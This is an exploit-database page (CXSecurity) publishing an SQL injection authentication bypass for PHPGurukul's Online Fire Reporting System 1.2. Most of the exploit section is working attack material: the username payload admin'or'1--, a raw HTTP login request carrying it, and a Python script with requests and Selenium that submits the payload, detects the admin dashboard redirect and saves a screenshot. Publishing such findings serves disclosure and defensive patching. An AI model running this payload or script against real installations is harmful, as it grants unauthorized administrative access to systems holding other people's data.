---
title: Online Fire Reporting System OFRS  SQL Injection Authentication Bypass
url: https://cxsecurity.com/issue/WLB-2024060022
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-08
fetch_date: 2025-10-06T16:54:27.447049
---

# Online Fire Reporting System OFRS  SQL Injection Authentication Bypass

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Online Fire Reporting System OFRS SQL Injection Authentication Bypass** **2024.06.07**  Credit:  **[Diyar Saadi](https://cxsecurity.com/author/Diyar%2BSaadi/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

# Exploit Title: Online Fire Reporting System SQL Injection Authentication Bypass
# Date: 02/10/2024
# Exploit Author: Diyar Saadi
# Vendor Homepage: https://phpgurukul.com/online-fire-reporting-system-using-php-and-mysql/
# Software Link: https://phpgurukul.com/projects/Online-Fire-Reporting-System-using-PHP.zip
# Version: V 1.2
# Tested on: Windows 11 + XAMPP 8.0.30
## Exploit Description ##
SQL Injection Vulnerability in ofrs/admin/index.php :
The SQL injection vulnerability in the ofrs/admin/index.php script arises from insecure handling of user input during the login process.
## Steps to reproduce ##
1- Open the admin panel page by following URL : http://localhost/ofrs/admin/index.php
2- Enter the following payload from username-box : admin'or'1--
3- Press Login button or press Enter .
## Proof Of Concept [1] ##
POST /ofrs/admin/index.php HTTP/1.1
Host: localhost
Content-Length: 46
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="121", "Not A(Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/ofrs/admin/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=fmnj70mh1qo2ssv80mlsv50o29
Connection: close
username=admin%27or%27--&inputpwd=&login=login
## Proof Of Concept [ Python Based Script ] [2] ##
import os
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected\_conditions as EC
import pyautogui
banner = """
░█████╗░███████╗██████╗░░██████╗  ░█████╗░███╗░░░███╗░██████╗
██╔══██╗██╔════╝██╔══██╗██╔════╝  ██╔══██╗████╗░████║██╔════╝
██║░░██║█████╗░░██████╔╝╚█████╗░  ██║░░╚═╝██╔████╔██║╚█████╗░
██║░░██║██╔══╝░░██╔══██╗░╚═══██╗  ██║░░██╗██║╚██╔╝██║░╚═══██╗
╚█████╔╝██║░░░░░██║░░██║██████╔╝  ╚█████╔╝██║░╚═╝░██║██████╔╝
░╚════╝░╚═╝░░░░░╚═╝░░╚═╝╚═════╝░  ░╚════╝░╚═╝░░░░░╚═╝╚═════╝░
# Code By : Diyar Saadi
"""
print(banner)
payload\_requests = input("Enter the payload: ")
url\_requests = "http://localhost/ofrs/admin/index.php"
data = {
'username': payload\_requests,
'password': 'password',
'login': 'Login'
}
headers = {
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
'Content-Type': 'application/x-www-form-urlencoded',
'Custom-Header': 'Your-Custom-Value'
}
try:
response = requests.post(url\_requests, data=data, headers=headers, allow\_redirects=False)
if response.status\_code == 302 and response.headers.get('Location') and 'dashboard.php' in response.headers['Location']:
print("Requests version: Admin Panel Successfully Bypassed !")
url\_selenium = "http://localhost/ofrs/admin/index.php"
chrome\_driver\_path = "C:\\Windows\\webdriver\\chromedriver.exe"
chrome\_options = webdriver.ChromeOptions()
chrome\_options.add\_argument("executable\_path=" + chrome\_driver\_path)
driver = webdriver.Chrome(options=chrome\_options)
driver.get(url\_selenium)
pyautogui.typewrite(payload\_requests)
pyautogui.press('tab')
pyautogui.typewrite(payload\_requests)
pyautogui.press('enter')
WebDriverWait(driver, 10).until(EC.url\_contains("dashboard.php"))
screenshot\_path = os.path.join(os.getcwd(), "dashboard\_screenshot.png")
driver.save\_screenshot(screenshot\_path)
print(f"Selenium version: Screenshot saved as {screenshot\_path}")
driver.quit()
else:
print("Requests version: Login failed.")
except Exception as e:
print(f"An error occurred: {e}")

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024060022)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top